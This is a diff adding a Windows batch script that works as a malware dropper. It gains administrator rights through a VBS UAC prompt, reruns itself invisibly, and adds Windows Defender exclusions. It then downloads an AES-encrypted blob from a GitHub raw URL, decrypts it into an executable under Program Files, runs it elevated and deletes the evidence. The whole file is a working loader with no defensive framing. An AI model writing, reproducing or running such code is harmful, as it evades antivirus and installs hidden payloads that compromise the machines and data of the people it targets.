@@ -1,0 +1,67 @@
+@echo off
+:: ========================================
+::  Force Administrator rights + Run Invisible
+:: ========================================
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+if '%errorlevel%' NEQ '0' (
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
+    "%temp%\getadmin.vbs"
+    exit /B
+)
+
+:: Make it completely invisible after UAC
+if "%1"=="hidden" goto :main
+start "" /b "%~f0" hidden
+exit /B
+
+:main
+
+set "payloadpath=C:\Program Files\restored.exe"
+set "txtpath=C:\Program Files\output.txt"
+
+:: ========================================
+::  Add Defender exclusions
+:: ========================================
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+"Add-MpPreference -ExclusionPath \"C:\Program Files\",\"%payloadpath%\" -ErrorAction SilentlyContinue"
+
+:: ========================================
+::  Download to C:\Program Files
+:: ========================================
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Lazyoshio/pcwork/refs/heads/main/smartscreen.txt' -OutFile \"%txtpath%\" -UseBasicParsing"
+
+:: ========================================
+::  Decrypt using your exact AES logic
+:: ========================================
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+"$k=New-Object Security.Cryptography.Rfc2898DeriveBytes('mypassword',[byte[]](1..16),1000); ^
+ $aes=[Security.Cryptography.Aes]::Create(); ^
+ $aes.Key=$k.GetBytes(32); $aes.IV=$k.GetBytes(16); ^
+ $d=$aes.CreateDecryptor(); ^
+ $c=[Convert]::FromBase64String((Get-Content \"%txtpath%\" -Raw)); ^
+ $b=$d.TransformFinalBlock($c,0,$c.Length); ^
+ [IO.File]::WriteAllBytes(\"%payloadpath%\",$b)"
+
+:: ========================================
+::  Extra steps (Unblock + re-exclude)
+:: ========================================
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+"Add-MpPreference -ExclusionPath \"%payloadpath%\" -ErrorAction SilentlyContinue; Unblock-File -Path \"%payloadpath%\" -ErrorAction SilentlyContinue"
+
+timeout /t 3 /nobreak >nul
+
+:: ========================================
+::  Run the payload as Administrator and wait for it to finish
+:: ========================================
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+"try { Start-Process -FilePath \"%payloadpath%\" -Verb RunAs -Wait } catch { }"
+
+:: ========================================
+::  Clean up - Delete files after execution
+:: ========================================
+del /f /q "%txtpath%" >nul 2>&1
+del /f /q "%payloadpath%" >nul 2>&1
+
+exit
